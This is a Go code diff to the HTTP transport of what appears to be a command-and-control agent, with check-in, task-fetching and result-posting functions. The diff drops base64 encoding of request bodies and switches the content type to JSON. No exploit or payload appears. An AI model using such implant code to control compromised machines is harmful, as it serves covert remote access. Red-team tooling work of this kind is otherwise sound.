@@ -89,11 +89,8 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		}
 	}
 
-	// Base64 encode the data
-	encodedData := base64.StdEncoding.EncodeToString(body)
-
 	// Send checkin request to configured endpoint
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.Endpoint, body)
 	if err != nil {
 		return fmt.Errorf("checkin request failed: %w", err)
 	}
@@ -131,10 +128,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		}
 	}
 
-	// Base64 encode the data
-	encodedData := base64.StdEncoding.EncodeToString(body)
-
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.Endpoint, body)
 	if err != nil {
 		return nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
@@ -209,10 +203,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response) error {
 		}
 	}
 
-	// Base64 encode the data
-	encodedData := base64.StdEncoding.EncodeToString(body)
-
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.Endpoint, body)
 	if err != nil {
 		return fmt.Errorf("post response request failed: %w", err)
 	}
@@ -246,7 +237,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 
 	// Set headers
 	req.Header.Set("User-Agent", h.UserAgent)
-	req.Header.Set("Content-Type", "text/plain")
+	req.Header.Set("Content-Type", "application/json")
 
 	if h.Debug {
 		log.Printf("[DEBUG] Making %s request to %s", method, url)
